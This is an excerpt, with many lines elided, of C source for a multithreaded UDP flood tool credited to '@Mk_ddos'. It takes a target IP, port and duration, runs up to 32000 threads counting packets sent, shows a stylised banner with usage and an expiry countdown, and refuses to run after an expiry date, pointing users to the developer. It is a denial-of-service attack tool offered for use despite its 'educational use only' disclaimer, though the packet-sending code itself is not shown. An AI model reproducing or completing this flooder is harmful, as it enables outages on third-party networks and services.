...
#define MAX_THREADS 32000          // Maximum number of threads for 32 cores
...
volatile _Atomic unsigned long total_packets_sent = 0;
...
void *udp_flood(void *arg) {
    ...
    while (time(NULL) < end_time && keep_running) {
        ...
        atomic_fetch_add(&total_packets_sent, 1); // Thread-safe increment
...
// Stylish printout function with TV on effect
void print_stylish_text() {
    ...
    // TV on effect ke liye lines ko dheere-dheere print karo
    const char *lines[] = {
        "╔════════════════════════════════════════════════════════════╗",
        "║ █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ ║",
        "║ █ ★  U D P   F L O O D   T O O L  ★ █ ║",
        "║ █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ ║",
        "╠════════════════════════════════════════════════════════════╣",
        "║ ✦ DEVELOPER: @Mk_ddos                ║",
        "║ ✦ EXPIRY: %d days, %02d:%02d:%02d           ║",
        "║ ✦ VERSION: 1.0.0                       ║",
        "║ ✦ USAGE: <IP> <PORT> <TIME>             ║",
        "║ ✦ DEFAULT PACKET SIZE: 999 bytes        ║",
        "║ ✦ DEFAULT THREADS: 1200                ║",
        "║ ✦ WARNING: FOR EDUCATIONAL USE ONLY!   ║",
        "║ ✦ DO NOT USE FOR MALICIOUS ACTIVITIES! ║",
        "╚════════════════════════════════════════════════════════════╝"
    };

    // Har line ko dheere-dheere print karo
    for (int i = 0; i < sizeof(lines) / sizeof(lines[0]); i++) {
        if (i == 6) {
            printf(lines[i], remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);
        } else {
            printf("\033[1;35m%s\033[0m\n", lines[i]);
        }
        usleep(200000); // 200ms delay for TV effect
    }
    printf("\n");
}

int main(int argc, char *argv[]) {
    // Print stylish text with TV on effect
    print_stylish_text();
    ...
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        ...
        printf("\033[1;31mExpired. khatam ho gya h developar se connect kr @Mk_ddos.\033[0m\n");
        return EXIT_FAILURE;
    }
    ...
    if (thread_count > MAX_THREADS) {
        printf("\033[1;31mThread count exceeds maximum limit. Setting to %d.\033[0m\n", MAX_THREADS);
